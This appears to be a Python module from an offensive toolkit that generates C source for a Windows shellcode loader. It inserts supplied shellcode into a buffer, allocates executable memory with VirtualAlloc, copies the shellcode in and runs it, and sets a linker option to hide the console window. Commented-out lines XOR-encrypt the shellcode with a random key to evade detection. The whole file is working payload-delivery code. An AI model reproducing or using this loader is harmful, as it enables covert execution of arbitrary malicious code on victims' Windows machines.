from ClassCongregation import BinaryDataTypeConversion
import random
__language__=".c"
__process__=".exe"

def main(Shellcode):
    # BytesTypeBinaryData=BinaryDataTypeConversion().StringToBytes(Shellcode)#对数据进行类型转换
    # GenerateRandomNumber=random.randint(1, 255)#生成的随机数
    # XOREncryption=BinaryDataTypeConversion().XOR(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
    Code = """
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

unsigned char buf[] = \""""+Shellcode+"""\";
int main()

{
    LPVOID Memory;

    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();
    return 0;

}"""
    return Code

